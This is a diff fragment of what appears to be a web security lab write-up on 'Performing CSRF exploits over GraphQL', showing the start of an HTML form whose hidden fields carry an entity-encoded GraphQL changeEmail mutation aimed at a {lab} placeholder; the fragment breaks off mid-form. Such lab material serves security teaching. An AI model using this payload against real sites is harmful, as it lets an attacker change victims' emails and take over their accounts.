@@ -1,6 +1,6 @@
 **Performing CSRF exploits over GraphQL**
 
-```
+```xml
     <form action="https://{lab}/graphql/v1" method="POST">
       <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#123;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#123;email&#125;&#125;" />
       <input type="hidden" name="operationName" value="changeEmail" />
